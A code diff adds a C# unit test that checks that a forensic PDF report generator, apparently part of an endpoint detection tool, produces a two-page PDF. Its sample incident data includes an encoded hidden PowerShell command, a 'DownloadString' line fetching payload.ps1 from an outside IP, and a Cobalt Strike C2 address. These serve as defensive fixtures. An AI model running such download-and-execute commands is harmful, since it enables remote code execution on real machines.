@@ -215,4 +215,67 @@ public class ForensicPdfReportGeneratorTests
             }
         }
     }
+
+    [Fact]
+    public void GenerateReportBytes_ProducesTwoPageDocumentWithBothPagesPopulated()
+    {
+        // 1. Arrange
+        var incident = new IncidentItemViewModel
+        {
+            IncidentId = "INC-TWOPAGE-001",
+            Timestamp = DateTime.UtcNow,
+            TargetPid = 12345,
+            TargetImage = @"C:\Windows\System32\powershell.exe",
+            CommandLine = "powershell.exe -w hidden -enc JABjAGwAYQBz...",
+            ParentPid = 9999,
+            ParentImage = @"C:\Windows\explorer.exe",
+            VerdictAction = "ACTION_KILL",
+            StatusSeverity = "CRITICAL",
+            ConfidenceScore = 0.98,
+            SummaryTitle = "Two-Page Layout Verification Incident",
+            Narrative = "A4 2페이지 명시적 분할 레이아웃이 적용되어 1페이지와 2페이지에 각각 전용 섹션이 안정적으로 렌더링되는지 검증합니다.",
+            BlockedIp = "185.220.101.5",
+            ElapsedMs = 1234.5
+        };
+        incident.MitreTactics.Add("T1059.001");
+        incident.RemediationSteps.Add("1. 악성 C2 IP 차단 완료");
+        incident.RemediationSteps.Add("2. 타깃 프로세스 강제 사살");
+        incident.Traces.Add(new ReActStepViewModel
+        {
+            StepNumber = 1,
+            ActionTool = "DecodePayloadTool",
+            Thought = "난독화 명령을 해독합니다.",
+            Observation = "DownloadString('http://185.220.101.5/payload.ps1')",
+            ElapsedMs = 2500.0
+        });
+        incident.Traces.Add(new ReActStepViewModel
+        {
+            StepNumber = 2,
+            ActionTool = "ThreatReputationTool",
+            Thought = "C2 IP 평판을 조회합니다.",
+            Observation = "Cobalt Strike C2 (98점)",
+            ElapsedMs = 1500.0
+        });
+
+        var generator = new ForensicPdfReportGenerator();
+
+        // 2. Act
+        byte[] bytes = generator.GenerateReportBytes(incident);
+
+        // 3. Assert
+        Assert.NotNull(bytes);
+        Assert.True(bytes.Length > 3072, $"2페이지 PDF 크기가 예상보다 작습니다: {bytes.Length} bytes");
+        // PDF Magic bytes
+        Assert.Equal(0x25, bytes[0]); // '%'
+        Assert.Equal(0x50, bytes[1]); // 'P'
+        Assert.Equal(0x44, bytes[2]); // 'D'
+        Assert.Equal(0x46, bytes[3]); // 'F'
+        Assert.Equal(0x2D, bytes[4]); // '-'
+
+        // UTF-8 변환 후 PDF 내 2페이지 분할 지표 확인
+        string pdfText = System.Text.Encoding.Latin1.GetString(bytes);
+        // /Type /Page 카운트가 최소 2개 이상 존재하는지 확인
+        int pageMatches = System.Text.RegularExpressions.Regex.Matches(pdfText, @"/Type\s*/Page\b").Count;
+        Assert.True(pageMatches >= 2, $"생성된 PDF 페이지 수가 2페이지 이상이어야 합니다. 실제 감지: {pageMatches}");
+    }
 }
